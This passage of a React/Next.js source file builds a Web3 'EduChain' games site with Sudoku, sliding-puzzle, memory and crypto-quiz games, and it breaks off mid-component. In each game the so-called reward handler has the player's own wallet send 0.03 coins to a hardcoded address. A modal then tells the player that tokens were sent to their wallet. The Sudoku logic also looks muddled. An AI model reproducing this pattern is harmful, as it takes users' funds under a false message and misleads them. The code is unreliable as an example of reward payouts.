"use client"

import { useState, useEffect, useRef } from "react"
import { Search, Menu, X, RefreshCw, ShoppingCart } from "lucide-react"
import Link from "next/link"
import { motion, AnimatePresence } from "framer-motion"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { useSession, signOut } from "next-auth/react"
import { useRouter } from "next/navigation"
import { signIn } from "next-auth/react"
import { ethers } from "ethers"
import type { Eip1193Provider } from 'ethers'
import { ToastContainer, toast } from 'react-toastify'
import 'react-toastify/dist/ReactToastify.css'

// Add type definition for game
interface Game {
  title: string
  description: string
  image: string
  link?: string
  isSudoku?: boolean
}

// Add Sudoku game component
interface GameProps {
  onClose: () => void;
  walletAddress: string;
}

// Add type definitions
declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: any[] }) => Promise<any>;
      on: (eventName: string, callback: (params: any) => void) => void;
      removeListener: (eventName: string, callback: (params: any) => void) => void;
      isMetaMask?: boolean;
    };
    onYouTubeIframeAPIReady: () => void;
    YT: {
      Player: new (elementId: string, options: any) => {
        playVideo: () => void;
        pauseVideo: () => void;
        getCurrentTime: () => number;
        getDuration: () => number;
        destroy: () => void;
      };
      PlayerState: {
        PLAYING: number;
        PAUSED: number;
        ENDED: number;
      };
    };
  }
}

// Function to award rewards for game completion
const awardGameReward = async (walletAddress: string, rewardAmount: number): Promise<boolean> => {
  if (!walletAddress || !window.ethereum) {
    console.error("No wallet connected")
    return false
  }

  try {
    // For demonstration purposes, just log the reward
    console.log(`Award ${rewardAmount} tokens to ${walletAddress}`)
    
    // In a real implementation, you would call a smart contract
    // const contract = new ethers.Contract(contractAddress, abi, signer)
    // const tx = await contract.awardTokens(walletAddress, rewardAmount)
    // await tx.wait()
    
    return true
  } catch (error) {
    console.error("Error awarding tokens:", error)
    return false
  }
}

const SudokuGame = ({ onClose, walletAddress }: GameProps) => {
  const generateSudoku = () => {
    try {
      const board = Array.from({ length: 9 }, () => Array(9).fill(null));
      const solution = Array.from({ length: 9 }, () => Array(9).fill(null));

      // Fill diagonal 3x3 grids
      const fillDiagonal = () => {
        for (let i = 0; i < 9; i += 3) fillBox(i, i);
      };

      // Fill a 3x3 grid
      const fillBox = (row: number, col: number) => {
        let num: number;
        for (let i = 0; i < 3; i++) {
          for (let j = 0; j < 3; j++) {
            do {
              num = Math.floor(Math.random() * 9) + 1;
            } while (!isSafeInBox(row, col, num));
            solution[row + i][col + j] = num;
          }
        }
      };

      // Check if number is safe in a 3x3 box
      const isSafeInBox = (row: number, col: number, num: number): boolean => {
        for (let i = 0; i < 3; i++)
          for (let j = 0; j < 3; j++)
            if (solution[row + i][col + j] === num) return false;
        return true;
      };

      // Recursive Sudoku Solver
      const solveSudoku = (row = 0, col = 0): boolean => {
        if (col === 9) {
          row++;
          col = 0;
        }
        if (row === 9) return true;

        if (solution[row][col] !== null) return solveSudoku(row, col + 1);

        for (let num = 1; num <= 9; num++) {
          if (isSafe(row, col, num)) {
            solution[row][col] = num;
            if (solveSudoku(row, col + 1)) return true;
            solution[row][col] = null;
          }
        }
        return false;
      };

      // Check if num is safe in row, column, and box
      const isSafe = (row: number, col: number, num: number): boolean => {
        // Check row
        for (let x = 0; x < 9; x++)
          if (solution[row][x] === num) return false;

        // Check column
        for (let x = 0; x < 9; x++)
          if (solution[x][col] === num) return false;

        // Check 3x3 box
        const startRow = row - (row % 3);
        const startCol = col - (col % 3);
        for (let i = 0; i < 3; i++)
          for (let j = 0; j < 3; j++)
            if (solution[i + startRow][j + startCol] === num) return false;

        return true;
      };

      // Remove numbers to create puzzle
      const removeNumbers = (difficulty: number = 40): void => {
        let count = difficulty;
        while (count > 0) {
          const row = Math.floor(Math.random() * 9);
          const col = Math.floor(Math.random() * 9);
          if (solution[row][col] !== null) {
            board[row][col] = solution[row][col];
            solution[row][col] = null;
            count--;
          }
        }
      };

      fillDiagonal();
      if (solveSudoku()) {
        removeNumbers();
        return { puzzle: solution, solution: board };
      }
      throw new Error("Failed to generate valid Sudoku puzzle");
    } catch (error) {
      console.error("Error generating Sudoku:", error);
      return {
        puzzle: Array.from({ length: 9 }, () => Array(9).fill(null)),
        solution: Array.from({ length: 9 }, () => Array(9).fill(null))
      };
    }
  };

  const [gameState, setGameState] = useState(() => generateSudoku());
  const [board, setBoard] = useState(gameState.puzzle);
  const [showSuccess, setShowSuccess] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showTransactionModal, setShowTransactionModal] = useState(false);
  const [transactionHash, setTransactionHash] = useState<string | null>(null);

  const handleChange = (row: number, col: number, value: string) => {
    try {
      if (!/^[1-9]?$/.test(value)) return;
      if (value !== "" && parseInt(value) !== gameState.solution[row][col]) return;

      const newBoard = board.map((r, i) =>
        r.map((cell, j) => (i === row && j === col ? value : cell))
      );
      setBoard(newBoard);
      setError(null);
    } catch (error) {
      console.error("Error updating board:", error);
      setError("An error occurred while updating the board");
    }
  };

  const handleSubmit = async () => {
    try {
      const isComplete = board.every(row => row.every(cell => cell !== null));
      if (!isComplete) {
        setError("Please complete the puzzle first!");
        return;
      }

      const isCorrect = board.every((row, i) => 
        row.every((cell, j) => parseInt(cell || "0") === gameState.solution[i][j])
      );

      if (isCorrect) {
        setShowSuccess(true);
        setError(null);
        
        // Award tokens if wallet is connected
        if (walletAddress) {
          try {
            if (!window.ethereum) {
              throw new Error("Please install MetaMask");
            }

            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            
            const tx = {
              to: "0xbF188D68de8f9C232cC421dF11aa16d06b506BD1",
              value: ethers.parseEther("0.03")
            };
            
            const transaction = await signer.sendTransaction(tx);
            await transaction.wait();
            
            setTransactionHash(transaction.hash);
            setShowTransactionModal(true);
          } catch (error) {
            console.error("Error sending reward:", error);
            alert("Failed to send reward. Please try again.");
          }
        }

        setTimeout(() => {
          setShowSuccess(false);
          const newGame = generateSudoku();
          setGameState(newGame);
          setBoard(newGame.puzzle);
        }, 2000);
      } else {
        setError("Sorry, some numbers are incorrect. Please try again!");
      }
    } catch (error) {
      console.error("Error submitting puzzle:", error);
      setError("An error occurred while checking the puzzle");
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
      onClick={(e) => {
        e.stopPropagation();
        onClose();
      }}
    >
      <motion.div
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.9, opacity: 0 }}
        className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-md w-full"
        onClick={e => e.stopPropagation()}
      >
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-2xl font-bold">Blockchain Sudoku</h2>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
          >
            <X className="h-6 w-6" />
          </button>
        </div>

        <div className="flex flex-col items-center">
          {error && (
            <div className="mb-4 p-2 bg-red-100 dark:bg-red-900/20 text-red-600 dark:text-red-400 rounded text-sm">
              {error}
            </div>
          )}

          {showSuccess ? (
            <motion.div
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="text-center py-8"
            >
              <div className="text-4xl mb-4">🎉</div>
              <h3 className="text-2xl font-bold text-green-600 mb-2">Congratulations!</h3>
              <p className="text-gray-600 dark:text-gray-400">You solved the puzzle correctly!</p>
            </motion.div>
          ) : (
            <>
              <table className="border-collapse mb-6">
                <tbody>
                  {board.map((row, rowIndex) => (
                    <tr key={rowIndex}>
                      {row.map((cell, colIndex) => (
                        <td
                          key={colIndex}
                          className={`w-10 h-10 border border-gray-300 dark:border-gray-600 ${
                            (rowIndex + 1) % 3 === 0 && rowIndex < 8 ? 'border-b-2 border-b-black dark:border-b-white' : ''
                          } ${
                            (colIndex + 1) % 3 === 0 && colIndex < 8 ? 'border-r-2 border-r-black dark:border-r-white' : ''
                          }`}
                        >
                          <input
                            type="text"
                            value={cell || ""}
                            onChange={(e) => handleChange(rowIndex, colIndex, e.target.value)}
                            maxLength={1}
                            className="w-full h-full text-center bg-transparent focus:outline-none focus:bg-blue-100 dark:focus:bg-blue-900"
                            disabled={cell !== null}
                          />
                        </td>
                      ))}
                    </tr>
                  ))}
                </tbody>
              </table>
              <div className="flex gap-4">
                <Button
                  onClick={() => {
                    const newGame = generateSudoku();
                    setGameState(newGame);
                    setBoard(newGame.puzzle);
                    setError(null);
                  }}
                  className="bg-gradient-to-r from-purple-600 to-blue-500 text-white"
                >
                  New Puzzle
                </Button>
                <Button
                  onClick={handleSubmit}
                  className="bg-green-600 hover:bg-green-700 text-white"
                >
                  Submit
                </Button>
              </div>
            </>
          )}
        </div>
      </motion.div>

      {/* Transaction Success Modal */}
      <AnimatePresence>
        {showTransactionModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
            onClick={() => setShowTransactionModal(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-md w-full"
              onClick={e => e.stopPropagation()}
            >
              <div className="text-center">
                <h3 className="text-xl font-bold mb-4">Congratulations!</h3>
                <p className="mb-4">0.03 EDU tokens have been sent to your wallet!</p>
                {transactionHash && (
                  <a 
                    href={`https://edu-chain-testnet.blockscout.com/tx/${transactionHash}`}
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="text-blue-500 hover:text-blue-700 underline"
                  >
                    View Transaction on Blockscout
                  </a>
                )}
              </div>
              <div className="mt-6 flex justify-center">
                <Button
                  onClick={() => setShowTransactionModal(false)}
                  className="bg-blue-500 hover:bg-blue-600 text-white"
                >
                  Close
                </Button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
};

// Add PuzzleGame component
const PuzzleGame = ({ onClose, walletAddress }: GameProps) => {
  const generateShuffledBoard = () => {
    const board = Array.from({ length: 9 }, (_, i) => (i < 8 ? i + 1 : null));
    for (let i = board.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [board[i], board[j]] = [board[j], board[i]];
    }
    return board;
  };

  const [board, setBoard] = useState(generateShuffledBoard());
  const [showSuccess, setShowSuccess] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showTransactionModal, setShowTransactionModal] = useState(false);
  const [transactionHash, setTransactionHash] = useState<string | null>(null);

  const moveTile = (index: number) => {
    const emptyIndex = board.indexOf(null);
    const validMoves = [
      emptyIndex - 1, emptyIndex + 1,
      emptyIndex - 3, emptyIndex + 3
    ];

    if (validMoves.includes(index)) {
      const newBoard = [...board];
      [newBoard[emptyIndex], newBoard[index]] = [newBoard[index], newBoard[emptyIndex]];
      setBoard(newBoard);
    }
  };

  const checkWin = () => {
    return board.every((tile, index) => tile === (index < 8 ? index + 1 : null));
  };

  useEffect(() => {
    if (checkWin()) {
      // Award tokens if wallet is connected
      if (walletAddress) {
        const sendReward = async () => {
          try {
            if (!window.ethereum) {
              throw new Error("Please install MetaMask");
            }

            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            
            const tx = {
              to: "0xbF188D68de8f9C232cC421dF11aa16d06b506BD1",
              value: ethers.parseEther("0.03")
            };
            
            const transaction = await signer.sendTransaction(tx);
            await transaction.wait();
            
            setTransactionHash(transaction.hash);
            setShowTransactionModal(true);
          } catch (error) {
            console.error("Error sending reward:", error);
            alert("Failed to send reward. Please try again.");
          }
        };

        sendReward();
      }
    }
  }, [board, walletAddress]);

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <motion.div
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.9, opacity: 0 }}
        className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-md w-full"
        onClick={e => e.stopPropagation()}
      >
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-2xl font-bold">Sliding Puzzle Game</h2>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
          >
            <X className="h-6 w-6" />
          </button>
        </div>

        <div className="flex flex-col items-center">
          {error && (
            <div className="mb-4 p-2 bg-red-100 dark:bg-red-900/20 text-red-600 dark:text-red-400 rounded text-sm">
              {error}
            </div>
          )}

          {showSuccess ? (
            <motion.div
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="text-center py-8"
            >
              <div className="text-4xl mb-4">🎉</div>
              <h3 className="text-2xl font-bold text-green-600 mb-2">Congratulations!</h3>
              <p className="text-gray-600 dark:text-gray-400">You solved the puzzle!</p>
            </motion.div>
          ) : (
            <>
              <div className="grid grid-cols-3 gap-2 mb-6">
                {board.map((tile, index) => (
                  <div
                    key={index}
                    onClick={() => moveTile(index)}
                    className={`w-20 h-20 flex items-center justify-center text-2xl font-bold rounded cursor-pointer
                      ${tile ? 'bg-blue-500 text-white' : 'bg-gray-200 dark:bg-gray-700'}
                      hover:opacity-90 transition-opacity`}
                  >
                    {tile}
                  </div>
                ))}
              </div>
              <Button
                onClick={() => setBoard(generateShuffledBoard())}
                className="mt-4 bg-gradient-to-r from-green-600 to-green-500 text-white"
              >
                New Game
              </Button>
            </>
          )}
        </div>
      </motion.div>

      {/* Transaction Success Modal */}
      <AnimatePresence>
        {showTransactionModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
            onClick={() => setShowTransactionModal(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-md w-full"
              onClick={e => e.stopPropagation()}
            >
              <div className="text-center">
                <h3 className="text-xl font-bold mb-4">Congratulations!</h3>
                <p className="mb-4">0.03 EDU tokens have been sent to your wallet!</p>
                {transactionHash && (
                  <a 
                    href={`https://edu-chain-testnet.blockscout.com/tx/${transactionHash}`}
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="text-blue-500 hover:text-blue-700 underline"
                  >
                    View Transaction on Blockscout
                  </a>
                )}
              </div>
              <div className="mt-6 flex justify-center">
                <Button
                  onClick={() => setShowTransactionModal(false)}
                  className="bg-blue-500 hover:bg-blue-600 text-white"
                >
                  Close
                </Button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
};

// Add MemoryGame component
const MemoryGame = ({ onClose, walletAddress }: GameProps) => {
  const emojis = ["🍎", "🚀", "🐶", "🎸", "⚽", "🎃", "🌍", "🎯"];
  const [showTransactionModal, setShowTransactionModal] = useState(false);
  const [transactionHash, setTransactionHash] = useState<string | null>(null);

  const shuffleCards = () => {
    const shuffled = [...emojis, ...emojis]
      .sort(() => Math.random() - 0.5)
      .map((emoji, index) => ({ id: index, emoji, flipped: false, matched: false }));
    return shuffled;
  };

  const [cards, setCards] = useState(shuffleCards());
  const [selected, setSelected] = useState<number[]>([]);
  const [matchedPairs, setMatchedPairs] = useState(0);
  const [isChecking, setIsChecking] = useState(false);
  const [showReward, setShowReward] = useState(false);

  useEffect(() => {
    if (selected.length === 2 && !isChecking) {
      setIsChecking(true);
      const [first, second] = selected;
      
      if (cards[first].emoji === cards[second].emoji) {
        setCards(prev => 
          prev.map((card) =>
            card.id === first || card.id === second ? { ...card, matched: true } : card
          )
        );
        setMatchedPairs(prev => prev + 1);
        setSelected([]);
      } else {
        setTimeout(() => {
          setCards(prev =>
            prev.map((card) =>
              card.id === first || card.id === second ? { ...card, flipped: false } : card
            )
          );
          setSelected([]);
        }, 700);
      }
      setIsChecking(false);
    }
  }, [selected, cards, isChecking]);

  useEffect(() => {
    const handleReward = async () => {
      if (matchedPairs === emojis.length && !isChecking && !showReward) {
        setShowReward(true);
        // Award tokens if wallet is connected
        if (walletAddress) {
          try {
            if (!window.ethereum) {
              throw new Error("Please install MetaMask");
            }

            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            
            const tx = {
              to: "0xbF188D68de8f9C232cC421dF11aa16d06b506BD1",
              value: ethers.parseEther("0.03")
            };
            
            const transaction = await signer.sendTransaction(tx);
            await transaction.wait();
            
            setTransactionHash(transaction.hash);
            setShowTransactionModal(true);
          } catch (error) {
            console.error("Error sending reward:", error);
            alert("Failed to send reward. Please try again.");
          }
        }
      }
    };

    handleReward();
  }, [matchedPairs, isChecking, walletAddress, showReward]);

  const handleCardClick = (index: number) => {
    if (selected.length < 2 && !cards[index].flipped && !cards[index].matched && !isChecking) {
      setCards(prev =>
        prev.map((card, i) => (i === index ? { ...card, flipped: true } : card))
      );
      setSelected(prev => [...prev, index]);
    }
  };

  const handleNewGame = () => {
    setCards(shuffleCards());
    setSelected([]);
    setMatchedPairs(0);
    setIsChecking(false);
    setShowReward(false);
  };

  return (
    <>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
        onClick={onClose}
      >
        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          exit={{ scale: 0.9, opacity: 0 }}
          className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-md w-full"
          onClick={e => e.stopPropagation()}
        >
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold">Memory Card Game</h2>
            <button
              onClick={onClose}
              className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
            >
              <X className="h-6 w-6" />
            </button>
          </div>

          <div className="flex flex-col items-center">
            <div className="grid grid-cols-4 gap-2 mb-6">
              {cards.map((card, index) => (
                <motion.div
                  key={card.id}
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => handleCardClick(index)}
                  className={`w-16 h-16 flex items-center justify-center text-2xl rounded-lg cursor-pointer border-2 
                    ${card.flipped || card.matched 
                      ? 'bg-white dark:bg-gray-800 border-blue-500' 
                      : 'bg-gray-700 dark:bg-gray-600 border-gray-600 dark:border-gray-500'
                    } transition-colors duration-300`}
                >
                  {card.flipped || card.matched ? card.emoji : "❓"}
                </motion.div>
              ))}
            </div>
            
            {matchedPairs === emojis.length && (
              <motion.div
                initial={{ scale: 0.8, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                className="text-center py-4"
              >
                <div className="text-4xl mb-4">🎉</div>
                <h3 className="text-2xl font-bold text-green-600 mb-2">Congratulations!</h3>
                <p className="text-gray-600 dark:text-gray-400">You've matched all pairs!</p>
                {showReward && (
                  <p className="text-sm text-blue-600 dark:text-blue-400 mt-2">
                    Processing your reward...
                  </p>
                )}
              </motion.div>
            )}
            
            <Button
              onClick={handleNewGame}
              className="mt-4 bg-gradient-to-r from-green-600 to-green-500 text-white"
            >
              New Game
            </Button>
          </div>
        </motion.div>
      </motion.div>

      {/* Transaction Success Modal */}
      <AnimatePresence>
        {showTransactionModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
            onClick={() => setShowTransactionModal(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-md w-full"
              onClick={e => e.stopPropagation()}
            >
              <div className="text-center">
                <h3 className="text-xl font-bold mb-4">Congratulations!</h3>
                <p className="mb-4">0.03 EDU tokens have been sent to your wallet!</p>
                {transactionHash && (
                  <a 
                    href={`https://edu-chain-testnet.blockscout.com/tx/${transactionHash}`}
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="text-blue-500 hover:text-blue-700 underline"
                  >
                    View Transaction on Blockscout
                  </a>
                )}
              </div>
              <div className="mt-6 flex justify-center">
                <Button
                  onClick={() => setShowTransactionModal(false)}
                  className="bg-blue-500 hover:bg-blue-600 text-white"
                >
                  Close
                </Button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </>
  );
};

// Add QuizGame component after MemoryGame component and before export default
const QuizGame = ({ onClose, walletAddress }: GameProps) => {
  const questionsBank = [
    { question: "What is a blockchain?", options: ["A database", "A cryptocurrency", "A company", "A programming language"], answer: "A database" },
    { question: "Which consensus mechanism does Ethereum use after the Merge?", options: ["Proof of Work", "Proof of Stake", "Delegated Proof of Stake", "Byzantine Fault Tolerance"], answer: "Proof of Stake" },
    { question: "What is a smart contract?", options: ["A legal contract", "A program that runs on blockchain", "A digital signature", "A type of cryptocurrency"], answer: "A program that runs on blockchain" },
    { question: "Which blockchain feature ensures immutability?", options: ["Decentralization", "Encryption", "Hashing", "Forking"], answer: "Hashing" },
    { question: "What is a DApp?", options: ["A decentralized application", "A database app", "A financial app", "A digital asset"], answer: "A decentralized application" },
    { question: "What does NFT stand for?", options: ["New Finance Token", "Non-Fungible Token", "Network Fee Transaction", "Node Functional Technology"], answer: "Non-Fungible Token" },
    { question: "What is EduChain?", options: ["A blockchain for education", "A new cryptocurrency", "A coding framework", "A hardware wallet"], answer: "A blockchain for education" },
    { question: "Which token standard is used for NFTs?", options: ["ERC-20", "ERC-721", "BEP-2", "TRC-10"], answer: "ERC-721" },
    { question: "What does DeFi stand for?", options: ["Decentralized Finance", "Digital Fiat", "Developed Finance", "Distributed Funding"], answer: "Decentralized Finance" },
    { question: "What is gas in Ethereum?", options: ["A type of cryptocurrency", "The cost to execute transactions", "A blockchain protocol", "A mining technique"], answer: "The cost to execute transactions" },
    { question: "Who is the creator of Bitcoin?", options: ["Vitalik Buterin", "Elon Musk", "Satoshi Nakamoto", "Changpeng Zhao"], answer: "Satoshi Nakamoto" },
    { question: "What is the native cryptocurrency of Ethereum?", options: ["Bitcoin", "Ether", "Solana", "Polkadot"], answer: "Ether" },
    { question: "What is staking in blockchain?", options: ["Mining for rewards", "Locking up crypto for rewards", "Trading digital assets", "Writing smart contracts"], answer: "Locking up crypto for rewards" },
    { question: "Which blockchain platform is used for smart contracts?", options: ["Bitcoin", "Ethereum", "Litecoin", "Dogecoin"], answer: "Ethereum" },
    { question: "What is a blockchain fork?", options: ["A split in the blockchain network", "A security update", "A mining technique", "A type of NFT"], answer: "A split in the blockchain network" },
    { question: "What is the function of a crypto wallet?", options: ["To store digital currencies", "To mine Bitcoin", "To create NFTs", "To launch ICOs"], answer: "To store digital currencies" },
    { question: "What is an Initial Coin Offering (ICO)?", options: ["A new NFT collection", "A fundraising method for crypto projects", "A blockchain upgrade", "A DeFi lending protocol"], answer: "A fundraising method for crypto projects" },
    { question: "Which blockchain is known for its speed and low fees?", options: ["Bitcoin", "Ethereum", "Solana", "Cardano"], answer: "Solana" },
    { question: "What is a DAO?", options: ["A Decentralized Autonomous Organization", "A data analysis tool", "A smart contract framework", "A crypto mining pool"], answer: "A Decentralized Autonomous Organization" },
    { question: "What does 'HODL' mean in crypto?", options: ["Hold On for Dear Life", "A type of blockchain", "A crypto exchange", "A smart contract"], answer: "Hold On for Dear Life" },
    { question: "What is a Web3 wallet?", options: ["A decentralized wallet for blockchain", "A centralized banking wallet", "A digital notepad", "A DeFi token"], answer: "A decentralized wallet for blockchain" },
    { question: "What is Metamask used for?", options: ["Mining Bitcoin", "Storing digital assets and interacting with DApps", "Creating smart contracts", "Generating NFTs"], answer: "Storing digital assets and interacting with DApps" },
    { question: "Which consensus mechanism does Bitcoin use?", options: ["Proof of Stake", "Delegated Proof of Stake", "Proof of Work", "Byzantine Fault Tolerance"], answer: "Proof of Work" },
    { question: "What is the main benefit of Web3?", options: ["Centralized control", "Decentralization and user ownership", "Government regulation", "Faster banking transactions"], answer: "Decentralization and user ownership" },
    { question: "What does 'mining' mean in blockchain?", options: ["Solving complex puzzles to validate transactions", "Creating new smart contracts", "Generating NFTs", "Running a DAO"], answer: "Solving complex puzzles to validate transactions" }
  ];

  const getRandomQuestions = () => {
    return [...questionsBank].sort(() => 0.5 - Math.random()).slice(0, 5);
  };

  const [questions, setQuestions] = useState(getRandomQuestions());
  const [score, setScore] = useState(0);
  const [selectedAnswers, setSelectedAnswers] = useState<Record<string, string>>({});
  const [showScore, setShowScore] = useState(false);
  const [showTransactionModal, setShowTransactionModal] = useState(false);
  const [transactionHash, setTransactionHash] = useState<string | null>(null);

  const handleAnswer = (question: string, answer: string) => {
    if (showScore) return;
    setSelectedAnswers({ ...selectedAnswers, [question]: answer });
  };

  const handleSubmit = async () => {
    if (Object.keys(selectedAnswers).length !== questions.length) {
      alert("Please answer all questions before submitting!");
      return;
    }

    let currentScore = 0;
    questions.forEach(({ question, answer }) => {
      if (selectedAnswers[question] === answer) {
        currentScore++;
      }
    });
    setScore(currentScore);
    setShowScore(true);

    // Award tokens if wallet is connected and score is perfect
    if (walletAddress && currentScore === questions.length) {
      try {
        if (!window.ethereum) {
          throw new Error("Please install MetaMask");
        }

        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        
        const tx = {
          to: "0xbF188D68de8f9C232cC421dF11aa16d06b506BD1",
          value: ethers.parseEther("0.03")
        };
        
        const transaction = await signer.sendTransaction(tx);
        await transaction.wait();
        
        setTransactionHash(transaction.hash);
        setShowTransactionModal(true);
      } catch (error) {
        console.error("Error sending reward:", error);
        alert("Failed to send reward. Please try again.");
      }
    }
  };

  const restartGame = () => {
    setQuestions(getRandomQuestions());
    setScore(0);
    setSelectedAnswers({});
    setShowScore(false);
  };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <motion.div
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.9, opacity: 0 }}
        className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-2xl w-full max-h-[90vh] flex flex-col"
        onClick={e => e.stopPropagation()}
      >
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-2xl font-bold">Web3 & EduChain Quiz</h2>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
          >
            <X className="h-6 w-6" />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto pr-4 space-y-6">
          {questions.map(({ question, options }, index) => (
            <div key={index} className="bg-gray-50 dark:bg-gray-800 rounded-lg p-4">
              <h3 className="text-lg font-semibold mb-3">{question}</h3>
              <div className="space-y-2">
                {options.map((option) => (
                  <button
                    key={option}
                    className={`w-full p-3 text-left rounded-lg transition-colors duration-200 ${
                      showScore
                        ? option === questions.find((q) => q.question === question)?.answer
                          ? "bg-green-500 text-white"
                          : option === selectedAnswers[question]
                          ? "bg-red-500 text-white"
                          : "bg-gray-200 dark:bg-gray-700"
                        : selectedAnswers[question] === option
                        ? "bg-blue-500 text-white"
                        : "bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600"
                    }`}
                    onClick={() => handleAnswer(question, option)}
                    disabled={showScore}
                  >
                    {option}
                  </button>
                ))}
              </div>
            </div>
          ))}
        </div>

        <div className="mt-6 flex flex-col items-center gap-4">
          {showScore ? (
            <>
              <h2 className="text-2xl font-bold mb-4">Score: {score} / {questions.length}</h2>
              <Button
                onClick={restartGame}
                className="bg-gradient-to-r from-purple-600 to-blue-500 text-white"
              >
                New Quiz
              </Button>
            </>
          ) : (
            <Button
              onClick={handleSubmit}
              className="bg-gradient-to-r from-purple-600 to-blue-500 text-white"
              disabled={Object.keys(selectedAnswers).length !== questions.length}
            >
              Submit Quiz
            </Button>
          )}
        </div>
      </motion.div>

      {/* Transaction Success Modal */}
      <AnimatePresence>
        {showTransactionModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
            onClick={() => setShowTransactionModal(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-md w-full"
              onClick={e => e.stopPropagation()}
            >
              <div className="text-center">
                <h3 className="text-xl font-bold mb-4">Congratulations!</h3>
                <p className="mb-4">0.03 EDU tokens have been sent to your wallet!</p>
                {transactionHash && (
                  <a 
                    href={`https://edu-chain-testnet.blockscout.com/tx/${transactionHash}`}
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="text-blue-500 hover:text-blue-700 underline"
                  >
                    View Transaction on Blockscout
                  </a>
                )}
              </div>
              <div className="mt-6 flex justify-center">
                <Button
                  onClick={() => setShowTransactionModal(false)}
                  className="bg-blue-500 hover:bg-blue-600 text-white"
                >
                  Close
                </Button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
